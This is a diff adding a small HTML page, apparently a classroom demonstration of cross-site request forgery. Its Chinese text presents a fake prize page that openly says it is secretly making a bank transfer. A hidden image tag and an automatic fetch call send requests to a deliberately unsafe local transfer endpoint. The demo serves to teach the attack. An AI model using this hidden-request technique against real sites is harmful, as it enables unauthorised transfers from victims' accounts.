@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>黑客钓鱼网站</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css">
+</head>
+<body class="container">
+    <hgroup>
+        <h2>🎁 恭喜你中奖了！</h2>
+        <p>（这是一个伪造的网页，表面在发奖品，实际上正在偷偷请求你的银行）</p>
+    </hgroup>
+
+    <!-- 隐藏的 CSRF 攻击代码 -->
+    <img src="http://localhost:3000/api/unsafe-transfer" style="display: none;" alt="隐藏的攻击代码">
+
+    <article style="text-align: center; border-color: #e74c3c;">
+        <h3 style="color: #e74c3c;">正在利用你的身份偷偷转账...</h3>
+        <p>请去“银行”标签页刷新余额看看发生了什么。</p>
+    </article>
+
+    <script>
+        // 模拟 GET 请求攻击
+        setTimeout(() => {
+            fetch('http://localhost:3000/api/unsafe-transfer')
+                .then(res => console.log('攻击完成'));
+        }, 1000);
+    </script>
+</body>
+</html>
